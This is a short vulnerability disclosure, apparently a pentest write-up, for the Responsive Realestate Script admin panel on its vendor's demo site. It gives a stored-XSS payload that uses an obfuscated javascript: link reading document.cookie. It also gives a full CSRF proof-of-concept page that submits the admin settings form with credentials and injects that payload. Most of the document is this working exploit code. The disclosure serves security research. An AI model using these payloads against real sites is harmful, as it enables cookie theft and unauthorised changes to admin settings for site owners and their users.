### Responsive Realestate Script  XSS/CSRF

Well, when I pentest the official demo site of Responsive Realestate Script, I found some vulnerabilities here.


#### XSS:

There're some stored-xss in this system, for example:

http://thavasu.com/demo/property-listing/admin/general.php

POST para:
```
Content-Disposition: form-data; name="gplus"

https://plus.google.com/'"><a href="javasc&NewLine;ript&colon;alert(document.cookie)">Xss Here</a>
------WebKitFormBoundaryfu9qSQ2wg10j0QFz
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Responsive-Realestate-Script/xss1.png)

 By the way , the other parameters here also suffer.


#### CSRF:

Because of no protection here, we can use csrf attack to cheat the user to insert stored-xss content, or change something sensitive directly.

POC:


```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/thavasu.com\/demo\/property-listing\/admin\/general", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryfu9qSQ2wg10j0QFz");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"website_title\"\r\n" + 
          "\r\n" + 
          "Proprietati imobiliare\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"website_keyword\"\r\n" + 
          "\r\n" + 
          "\x3cp\x3eproperty listing, property listing script\x3c/p\x3e\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"contact_us\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"website_url\"\r\n" + 
          "\r\n" + 
          "http://thavasu.com/demo/property-listing\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"admin_email\"\r\n" + 
          "\r\n" + 
          "sakthi@phpscriptsmall.net\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"admin_mobile\"\r\n" + 
          "\r\n" + 
          "0753310591\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"paypal_email\"\r\n" + 
          "\r\n" + 
          "paypal@gmail.com\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"facebook\"\r\n" + 
          "\r\n" + 
          "https://www.facebook.com/\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"twitter\"\r\n" + 
          "\r\n" + 
          "https://twitter.com/\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"gplus\"\r\n" + 
          "\r\n" + 
          "https://plus.google.com/\'\"\x3e\x3ca href=\"javasc&NewLine;ript&colon;alert(document.cookie)\"\x3eXss Here\x3c/a\x3e\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"skype\"\r\n" + 
          "\r\n" + 
          "https://www.skype.com/en/\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"copyright\"\r\n" + 
          "\r\n" + 
          "Copyright \xc2\xa9 2017  All rights reserved.\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"Img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Save\r\n" + 
          "------WebKitFormBoundaryfu9qSQ2wg10j0QFz--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

